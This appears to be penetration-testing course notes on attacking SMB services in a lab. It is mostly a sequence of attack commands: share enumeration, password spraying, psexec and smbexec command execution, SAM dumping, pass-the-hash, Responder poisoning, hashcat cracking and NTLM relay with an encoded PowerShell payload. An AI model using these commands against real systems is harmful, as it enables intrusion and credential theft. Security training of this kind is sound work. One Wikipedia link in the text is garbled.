...
Another protocol that is commonly related to SMB is [MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft_cat iniRPC). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.
...
```shell-session
xF1NN@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
...
```shell-session
xF1NN@htb[/htb]$ smbclient -N -L //10.129.14.128
...
```shell-session
xF1NN@htb[/htb]$ smbmap -H 10.129.14.128
...
```shell-session
xF1NN@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
...
```shell-session
xF1NN@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
...
```shell-session
xF1NN@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
...
```shell-session
xF1NN@htb[/htb]$ rpcclient -U'%' 10.10.110.17
...
```shell-session
xF1NN@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
...
```shell-session
xF1NN@htb[/htb]$ cat /tmp/userlist.txt
...
```shell-session
xF1NN@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
...
```shell-session
xF1NN@htb[/htb]$ impacket-psexec -h
...
```shell-session
xF1NN@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
...
```shell-session
xF1NN@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
...
```shell-session
xF1NN@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
...
```shell-session
xF1NN@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
...
```shell-session
xF1NN@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
...
```shell-session
xF1NN@htb[/htb]$ responder -I <interface name>
```
...
```shell-session
xF1NN@htb[/htb]$ sudo responder -I ens33
...
```shell-session
xF1NN@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
...
```shell-session
xF1NN@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
...
```shell-session
xF1NN@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
...
```shell-session
xF1NN@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e '
```
